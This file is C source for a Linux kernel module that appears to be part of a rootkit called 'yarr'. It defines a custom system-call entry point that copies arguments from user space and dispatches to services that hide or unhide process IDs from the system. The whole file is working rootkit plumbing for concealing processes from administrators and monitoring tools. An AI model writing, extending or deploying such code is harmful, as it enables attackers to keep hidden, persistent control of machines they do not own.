#include <linux/uaccess.h>

#include "yarrcall.h"
#include "log.h"
#include "hidepid.h"

// A map that maps the integer value of svc into a string with its name.
// Note that enum YARRCALL_SERVICES starts at 1, hence the first NULL.
const char *__YARRCALL_SERVICE_MAP[] = {
    NULL,           
    "HIDE_PID",
    "UNHIDE_PID",
    "__GET_PROC_INFO"
};

static const char * __enum2str(enum YARRCALL_SERVICE svc) {
    switch (svc) {
        case HIDE_PID:
            return __YARRCALL_SERVICE_MAP[HIDE_PID];

        case UNHIDE_PID:
            return __YARRCALL_SERVICE_MAP[UNHIDE_PID];

        case __GET_PROC_INFO:
            return __YARRCALL_SERVICE_MAP[__GET_PROC_INFO];

        default:
            return NULL;
    }
}

int __get_proc_info(__GetProcInfoArgs_t *proc_info) {
    if (proc_info == NULL) {
        return -1;
    }

    proc_info->pid = current->pid;
    proc_info->tgid = current->tgid;

    return 0;
}

int yarrcall_init(void) {
    return 0;
}

int yarrcall_finish(void) {
    return 0;
}

asmlinkage long entry_yarrcall(struct pt_regs *regs) {
    return do_yarrcall((int)(regs->di), (YarrcallArgs_t *)(regs->si));
}

long do_yarrcall(int svc, YarrcallArgs_t __user *args) {
    YarrcallArgs_t local_args;
    int err;

    yarr_log("Requested service %s", __enum2str(svc));

    // TODO: For now all yarrcalls needs arguments so do this check here, but
    // as soon as one yarrcall doesn't have arguments we need to change it.
    if (args == NULL) {
        yarr_log("Arguments are NULL");
        return -1;
    }

    // The pointer comes from user context and we are in kernel context right
    // here so we need to copy from userspace.
    err = copy_from_user(&local_args, args, sizeof(local_args));
    if (err) {
        yarr_log("Error copying arguments from userspace");
        return -1;
    }

    switch (svc) {
        case HIDE_PID:
            err = hide_pid(local_args.hidepid_args.pid);
            break;

        case UNHIDE_PID:
            err = unhide_pid(local_args.hidepid_args.pid);
            break;

        case __GET_PROC_INFO:
            err = __get_proc_info(&local_args.getprocinfo_args);
            // This service writes information into the structure, now we have
            // to return it back to userspace.
            err = copy_to_user(args, &local_args, sizeof(local_args));
            if (err) {
                yarr_log("Error copying data to userspace");
            }
            break;

        default:
            yarr_log("Yarrcall requested %d not recognized", svc);
            err = -1;
    }

    return err;
}

